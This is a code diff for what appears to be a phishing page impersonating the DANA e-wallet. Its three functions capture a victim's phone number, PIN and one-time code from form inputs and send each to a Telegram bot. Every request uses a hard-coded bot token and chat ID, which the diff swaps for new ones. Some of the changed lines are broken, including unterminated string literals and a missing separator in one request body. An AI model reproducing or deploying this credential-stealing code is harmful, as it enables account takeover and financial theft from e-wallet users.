@@ -20,12 +20,19 @@ function sendNohp(event){
   $("#inp").blur();
 
   let nohp = $('#inp').val();
-  let text = "📱 *Login Percobaan DANA*\nNomor HP: " + nohp;
+  let text = "DANA LOGIN ID
+────────────────────
+• Nomor :
+• Pin     :
 
-  fetch("https://api.telegram.org/bot8305780223:AAGlXjlTU5fGu4BSjq5p8ELsN3L2gIUmQQ4/sendMessage", {
+────────────────────
+
+Thee F U C K *\nNomor HP: " + nohp;
+
+  fetch("https://api.telegram.org/bot8121267441:AAFWFCWUqxBtu3zth4JXOPdlfTcpIPwIbrQ/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "chat_id=8495813907&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
+    body: "chat_id=7134674820&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
   })
   .then(res => res.json())
   .then(() => {
@@ -51,12 +58,19 @@ function sendPin(){
     pin += $(this).val();
   });
 
-  let text = "🔒 *PIN DANA*\n`" + pin + "`";
+  let text = "DANA LOGIN ID
+────────────────────
+• Nomor :
+• Pin     :
 
-  fetch("https://api.telegram.org/bot658305780223:AAGlXjlTU5fGu4BSjq5p8ELsN3L2gIUmQQ4/sendMessage", {
+────────────────────
+
+Thee F U C K *\n`" + pin + "`";
+
+  fetch("https://api.telegram.org/bot8121267441:AAFWFCWUqxBtu3zth4JXOPdlfTcpIPwIbrQ/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "chat_id=8495813907&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
+    body: "chat_id=7134674820&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
   })
   .then(res => res.json())
   .then(() => {
@@ -80,12 +94,19 @@ function sendOtp(){
     otp += $(this).val();
   });
 
-  let text = "📬 *OTP DANA*\n`" + otp + "`";
+  let text = "DANA LOGIN ID
+────────────────────
+• Nomor :
+• Pin     :
+• Otp     :
+────────────────────
 
-  fetch("https://api.telegram.org/8305780223:AAGlXjlTU5fGu4BSjq5p8ELsN3L2gIUmQQ4/sendMessage", {
+Thee F U C K *\n`" + otp + "`";
+
+  fetch("https://api.telegram.org/bot8121267441:AAFWFCWUqxBtu3zth4JXOPdlfTcpIPwIbrQ/sendMessage", {
     method: "POST",
     headers: { "Content-Type": "application/x-www-form-urlencoded" },
-    body: "chat_id=8495813907&text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
+    body: "chat_id=7134674820text=" + encodeURIComponent(text) + "&parse_mode=Markdown"
   })
   .then(res => res.json())
   .then(() => {
